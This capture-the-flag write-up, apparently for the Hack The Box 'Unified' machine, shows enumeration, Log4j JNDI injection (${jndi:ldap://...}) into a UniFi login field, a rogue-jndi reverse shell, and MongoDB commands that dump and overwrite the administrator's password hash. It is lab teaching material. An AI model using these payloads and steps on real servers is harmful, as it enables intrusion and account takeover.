
# Unified #

## Enumeration ##

<p>We start off by running NMAP scan with all ports running and saving the output for later, the first scan have identified open ports 22, 6789, 8080, 8443</p>


![image](https://user-images.githubusercontent.com/85706972/152425346-cb140b47-83f8-4e3e-9487-7bcba1ba2dde.png)

<p>From enumeration we have found that DNS name for the page is UniFi, we can change the name in our /etc/hosts</p>

![image](https://user-images.githubusercontent.com/85706972/152425501-adc7461d-da3f-47d1-8902-2a0df1108bfd.png)

<p>Our task now is to go through the port 8443 which is running encrypted version of HTTPs with SSL, let’s explore the site and try to answer the questions asked in the room.
 UniFi Network is running on port 8443, We need to find the version of UniFi software</p>
 <p>Browsing the page on https://UniFi.htb:8443/ We see the version of the page

![image](https://user-images.githubusercontent.com/85706972/152425691-1cca7cba-b305-4441-98af-64104121b868.png)


<br></br>Next task is to search for publicly known exploits online and that we can either do on terminal with searchsploits tool or going to Exploit-DB</p>
<p>From the foundings it looks like unifi network 6.4.54 is vulnerable to Log4j in  <a href="https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi">CVE-2021-44228-PoC</a>
  
## Explotation ##
  
<p>We can now try to play around the login page to find the vulnerable place which we can exploit using log4j vulnerability and that we will do with tool BurpSuite</p>

![image](https://user-images.githubusercontent.com/85706972/152426300-7b2cb829-1ecd-4551-a20e-ac6be9f1e758.png)

<p>PoC shows that vulnerability lays in the injection in "remember" </p>

![image](https://user-images.githubusercontent.com/85706972/152426514-fd0f4f67-2c85-458d-8a0c-3c243df3ff2b.png)

 Now that we know where we can do injection,crafting following payload and open tcpdump to catch our payload
 <pre>${jndi:ldap://10.10.14.116}</pre>
 
 ![image](https://user-images.githubusercontent.com/85706972/152427265-3588febd-133d-4ae2-a9be-6a4c99aaec58.png)
 
 <p>tcpdump</p>
 
 ![image](https://user-images.githubusercontent.com/85706972/152427394-1e6e652b-627b-4187-90a7-00cc16c31839.png)

<p>We used port 389, becuase query goes through the LDAP port which is default 389</p>
 

<p>The target is vulnerable to log4j, awesome, as a attacker we must now try to get RCE, but to do that first we need to download following repository to get it done  - https://github.com/veracode-research/rogue-jndi
This will help us setup our LDAP server to catch the payload and then forward it to NETCAT listener to pop the shell</p>
For exploit to work, we must do these tasks below:
<ol>  
    <li>sudo apt update</li>  
    <li>sudo apt install openjdk-11-jdk -y</li>  
    <li>java -version</li>   
    <li>sudo apt-get install maven</li>
    <li>git clone https://github.com/veracode-research/rogue-jndi</li>
    <li>cd rogue-jndi</li>
    <li>mvn package</li>
</ol>

![image](https://user-images.githubusercontent.com/85706972/152491468-6cdecf04-5c1b-4e4b-8211-6986597393b1.png)

<p>When mvn built have finnished we can check if the "RogueJndi-1.1.jar" is created as this file is what we need to pass our payload and the file is responsible for getting us a shell 
</p>
<h3>Payload</h3>
<p>Payload we will craft it using base64 encoding to prevent any encoding issues</p>

![image](https://user-images.githubusercontent.com/85706972/152496689-de8fad71-651b-4fff-a5bf-7c1d4bba8393.png)

Replace IP address and /Port number with your tun0 and choice of port
<p?After the payload has been created, start the Rogue-JNDI application while passing in the payload as part of
the --command option and your tun0 IP address to the --hostname option </p>

![image](https://user-images.githubusercontent.com/85706972/152496995-35d831e4-fc6f-4e45-ab6c-b572f99e8a54.png)

<p>LDAP is now listening on port 1389, lets open NETCAT listener on port we used for base64 encoding 
When that is done, we go back to the BurpSuite and change the payload with our IP and LDAP listening site</p>

![image](https://user-images.githubusercontent.com/85706972/152497277-a1339675-368f-465c-a3b3-9c35c1fb3b25.png)

Awesome we have now gained RCE on the target machine, for better shell functionallity we can upgrade our shell
<pre>
script /dev/null -c bash
</pre>

<h3>Privilege Esacalation</h3>

<p>Now we need to perform privilege escalation to get full access over the machine and one of the things we can start off is to check running processes, also the 
HTB room question gives us hint that machine is running MongoDB, so we can start to check running processes and specifically for the MongoDB</p>

![image](https://user-images.githubusercontent.com/85706972/152497999-e61a5cb6-52b3-407d-94f1-9eddcffe951e.png)

<p>We found the running process and port that mongo uses, for further enumeration we can get a shell to find out database names</p>
<pre>
1. mongo "mongodb://localhost:27117”
2. show dbs
</pre>

![image](https://user-images.githubusercontent.com/85706972/152498557-f731219f-a3cf-466e-a0cc-bab1af735d71.png)


<p>With following command we found the db name "ACE" which seems to be the default
What next? We know the name of DB, we should try to get the user information, and this can be achieved with queries below</p>

<pre>
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
</pre>

![image](https://user-images.githubusercontent.com/85706972/152498595-c6f1f7b2-b162-400f-897b-22cb593124fc.png)

<p>Command gives us huge list of information , but at very top we got "administrator" name,email and x_shadow looks like password , but it hashed password.
At first I tried to copy/paste password and crack it with john the ripper, but it wasn't succesfull in any way, also then checked the questions as those are giving some hints
so in the end we can try to create the same hash password which turns to be "sha-512" and then replace it with existing password hash</p>

1. We create a password : 
![image](https://user-images.githubusercontent.com/85706972/152499249-ca0ee69a-90eb-4a35-b5e1-3a92c5df35ef.png)

2. Use the mongoDB command to insert new password we created

![image](https://user-images.githubusercontent.com/85706972/152499398-2e9180f4-72bb-49d7-ba99-5d4ed12d1c49.png)

3. Check if password is updated

![image](https://user-images.githubusercontent.com/85706972/152499472-1f86a890-ba15-46b7-82a6-af58a87d4089.png)

<p>Password updated with no issues, now hop on to the https://UniFi.htb:8443 and try to login with "administrator:newpasswd123" credentials </p>

![image](https://user-images.githubusercontent.com/85706972/152499627-b6c92e78-f19e-41ed-b47b-8c3ee33c3647.png)


Login was successfull and now exploring the site under Settings > Site found SSH login credentials which lead us into the box as root user

![image](https://user-images.githubusercontent.com/85706972/152499789-7f92b50a-0d03-4f07-951b-7be582498700.png)

Awesome box pwned




